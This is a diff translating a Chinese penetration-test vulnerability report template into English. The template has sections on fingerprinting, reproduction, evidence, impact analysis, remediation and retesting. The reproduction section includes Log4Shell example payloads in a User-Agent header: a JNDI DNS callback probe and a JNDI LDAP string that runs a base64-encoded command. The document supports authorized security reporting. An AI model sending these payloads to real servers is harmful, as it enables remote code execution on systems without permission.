@@ -1,69 +1,69 @@
 ---
-title: 漏洞报告模板
-cve: 无
+title: Vulnerability report template
+cve: None
 severity: info
 cvss: 0
-product: 方法论
-ports: 任意
+product: Methodology
+ports: Any
 keywords: report, template, cvss, remediation
 verified: false
-sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
+sources: Compiled from public sources (business-logic / implementation / configuration flaws without CVEs; see references below)
 ---
 
-## 标题
+## Title
 
-`<资产>: <组件> <漏洞名> (<CVE>) 导致 <影响，如 未授权 RCE>`
+`<asset>: <component> <vulnerability name> (<CVE>) leads to <impact, such as unauthenticated RCE>`
 
-## 1. 摘要（3 行内）
+## 1. Summary (three lines maximum)
 
-- 影响：谁能利用、拿到什么（未授权 / 低权 → SYSTEM / 域管）。
-- 条件：暴露面 + 版本 + 前置（出网、NLA、debug）。
-- 结论：已验证 / 未能验证（写明卡在哪）。
+- Impact: who can exploit it and what they obtain (unauthenticated / low privilege → SYSTEM / domain administrator).
+- Conditions: exposed surface + version + prerequisites (outbound access, NLA, debug).
+- Conclusion: verified / unable to verify (state the blocker).
 
-## 2. 资产与指纹
+## 2. Asset and fingerprints
 
-| 项 | 值 |
+| Item | Value |
 |---|---|
-| 目标 | `https://x.x.x.x:8443` |
-| 组件 | `Apache Log4j2 2.14.1`（证据：`jar` 名称 / 报错栈） |
-| 暴露面 | 公网 / 内网 / 仅本机 |
-| 已有防护 | WAF / 反代 / 无 |
+| Target | `https://x.x.x.x:8443` |
+| Component | `Apache Log4j2 2.14.1` (evidence: `jar` name / error stack) |
+| Exposure | Public / internal / local only |
+| Existing protection | WAF / reverse proxy / none |
 
-## 3. 复现（最小步骤）
+## 3. Reproduction (minimal steps)
 
 ```bash
-# 1) 版本证据
+# 1) Version evidence
 curl -sI https://target/ | grep -i '^server'
 
-# 2) 探测（L2）
+# 2) Probe (L2)
 curl -s https://target/ -H 'User-Agent: ${jndi:dns://xxxx.dnslog.cn}'
 
-# 3) 利用（L3，注明授权）
+# 3) Exploitation (L3, state authorization)
 curl -s https://target/ -H 'User-Agent: ${jndi:ldap://.../Basic/Command/base64/aWQ=}'
 ```
 
-## 4. 证据
+## 4. Evidence
 
-- 请求/响应原文（代码块，别截图）。
-- DNS/LDAP 回连记录、命令回显、时间戳。
+- Raw requests/responses (code blocks, not screenshots).
+- DNS/LDAP callback records, command output, timestamps.
 
-## 5. 影响分析
+## 5. Impact analysis
 
-- 数据面：可读/可改哪些数据（举例表名、文件路径）。
-- 权限面：能到哪一层（主机 / 域 / 云账号）。
-- 横向：同一凭据还能打哪些资产（列出）。
+- Data: what can be read/modified (example table names and file paths).
+- Privileges: the reachable level (host / domain / cloud account).
+- Lateral movement: list other assets accessible with the same credentials.
 
-## 6. 修复建议
+## 6. Remediation recommendations
 
-1. 立即：版本升级到 `<fixed version>`（给出 CVE 修复版本）。
-2. 缓解（无法立即升级时）：关闭入口、WAF 规则、网络 ACL、临时配置项。
-3. 加固：最小权限、日志告警规则（具体事件 ID / 字段）。
+1. Immediate: upgrade to `<fixed version>` (specify the CVE's fixed version).
+2. Mitigation (if immediate upgrading is impossible): disable the entry point, apply WAF rules, network ACLs, or temporary configuration changes.
+3. Hardening: least privilege and logging/alert rules (specific event IDs / fields).
 
-## 7. 复测
+## 7. Retesting
 
-- 复测命令（与第 3 节同一套）。
-- 复测结果：`已修复 / 部分修复 / 未修复`（附响应差异）。
+- Retest commands (same as section 3).
+- Retest result: `fixed / partially fixed / not fixed` (include response differences).
 
-## 8. 附录
+## 8. Appendix
 
-- 时间线、参与人、清理记录、参考链接（NVD / 厂商公告 / 分析文章）。
+- Timeline, participants, cleanup records, reference links (NVD / vendor advisories / analyses).
